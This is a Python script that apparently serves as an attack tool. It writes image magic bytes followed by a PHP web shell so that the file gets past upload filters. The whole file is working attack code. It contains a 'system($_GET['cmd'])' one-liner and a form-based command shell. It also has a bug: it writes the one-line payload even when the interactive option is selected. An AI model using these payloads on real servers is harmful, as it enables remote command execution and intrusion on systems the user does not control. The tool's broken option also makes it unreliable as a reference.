# Magic bytes image creator for arbitrary file upload bypass
import argparse

def generate_shell(output_file, file_type, interactive):
    # Dictionary of magic bytes for different image formats
    magic_bytes = {
        # hexadecimal bytes for each file type
        "jpg": b"\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01",
        "png": b"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A",
        "gif": b"\x47\x49\x46\x38\x39\x61",
        "bmp": b"\x42\x4D"
    }
    
    # PHP payload to execute commands via GET parameter
    payload_php = b"<?php system($_GET['cmd']); ?>"
    
    # Interactive PHP shell payload
    payload_interactive = b"""<?php
    echo '<form method="GET"><input type="TEXT" name="cmd" size="80"><input type="SUBMIT" value="Execute"></form>';
    if(isset($_GET['cmd'])) {
        echo '<pre>';
        system($_GET['cmd']);
        echo '</pre>';
    }
    ?>"""


    # Validate file type
    if file_type not in magic_bytes:
        print("[!] File type not supported")
        return
    
    # Choose payload type
    payload = payload_interactive if interactive else payload_php

    # Create and write to the output file
    with open(output_file, "wb") as f:
        f.write(magic_bytes[file_type])  # Write magic bytes
        f.write(b"\n")  # Newline for separation
        f.write(payload_php)  # Write PHP payload
    
    print(f"[+] File created successfully: {output_file}")

# main function for the script
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Magic bytes image creator for arbitrary file upload bypass")
    parser.add_argument("-o", "--output", required=True, help="Output file name")
    parser.add_argument("-t", "--type", required=True, choices=["jpg", "png", "gif", "bmp"], help="File type (jpg, png, gif, bmp)")
    parser.add_argument("-i", "--interactive", action="store_true", help="Use interactive PHP shell payload")
    
    args = parser.parse_args()
    
    generate_shell(args.output, args.type, args.interactive)
